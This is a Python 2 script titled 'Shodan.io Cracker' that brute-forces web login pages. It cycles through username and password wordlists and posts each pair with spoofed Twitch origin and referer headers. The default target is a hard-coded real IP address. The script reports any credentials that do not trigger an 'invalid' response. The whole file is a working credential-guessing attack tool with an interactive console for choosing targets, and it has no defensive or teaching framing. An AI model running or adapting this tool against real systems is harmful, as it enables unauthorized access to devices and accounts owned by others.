
# Shodan.io Cracker 6/22/2018
# Coded by Pythogen

# Shodan service cracker script

import sys
import requests
from time import sleep

print """
                                                            
		- Shodan Cracker -
"""

# Default login URL (Use 'url' command to set your target)
login_URL = "http://78.152.102.236/home.htm"
# Detecting incorrect password
keyword = "invalid"

uname = 'a'
pwd = 'a'
inc = 0
aPlace = 0
bPlace = 3

def console():
	global login_URL
	global keyword
	
	while(True):
		cmd = raw_input(" Enter command> ")
		if cmd == "help" or cmd == "?":
			print """\n Commands:
	config - Enter Target
	incpw - Configure PW Hit
	go - Activate Cracker
	exit - Exit Cracker
			"""
		elif cmd == "exit":
			sys.exit()
		elif cmd == "go":
			print "\n Shodan.io Cracker Activated! \n"
			bruteforce()
		elif cmd == "config":
			zbot = raw_input("Enter URL Host (/home.htm): ")
			login_URL = zbot
		elif cmd == "incpw":
			pbot = raw_input("Enter PW Hit: ")
			keyword = pbot
		else:
			print "\n Invalid Command\n"

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def bruteforce():
	global aPlace
	global bPlace
	global keyword
	global host
	global redirect
	global login_URL

	text_file = open("list.txt", "r")
	text_file2 = open("pw.txt", "r")

	with requests.Session() as c:
	
		# Username List 
		USERNAME = text_file.read().split('\n')
		# Password List
		PASSWORD = text_file2.read().split('\n')

		# Username cycle
		for u in USERNAME:
			# Password cycle (Only first three words)
			#for p in PASSWORD[aPlace:bPlace]:
			for p in PASSWORD:
				# Print process
				uname = u
				pwd = p
				print ' %s:%s' % (u,p)

				# 1) Direct to login url. Prepare for POST login
				c.get(login_URL)

				#POST Login data
				login_data = \
				{
					'username': u,
					'password': p,
					'Submit': 'Submit'
				}

				#Header data
				header_data = \
				{
					'Content-Type': 'text/plain;charset=UTF-8',
					'Origin': 'https://www.twitch.tv',
					'Referer': 'https://www.twitch.tv/',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36'
				}

				# 2) Submit POST data. Initialize login
				bruteforce.page = c.post(login_URL, data=login_data, headers=header_data)

				# 4) Looking for keyword indicating successful login
				Check = bruteforce.page.content.find(keyword)

				print bruteforce.page.content

				sleep(0.01)

				# Check = incorrect , Check2 = invalid
				# If 'incorrect' and 'invalid' not found, then you've cracked the password.
				if Check == -1:
					print "\n Double Checking... \n"
					c.get(login_URL)

					# 2) Submit POST data. Initialize login
					bruteforce.page = c.post(login_URL, data=login_data, headers=header_data)

					# 4) Looking for keyword indicating successful login
					Check2 = bruteforce.page.content.find(keyword)
					if Check2 == -1:
						print "\n Cracked: %s:%s \n" % (u,p)
						return
				# Otherwise, continue..
				else:
					pass

		text_file.close()
		text_file2.close()
		print ""

console()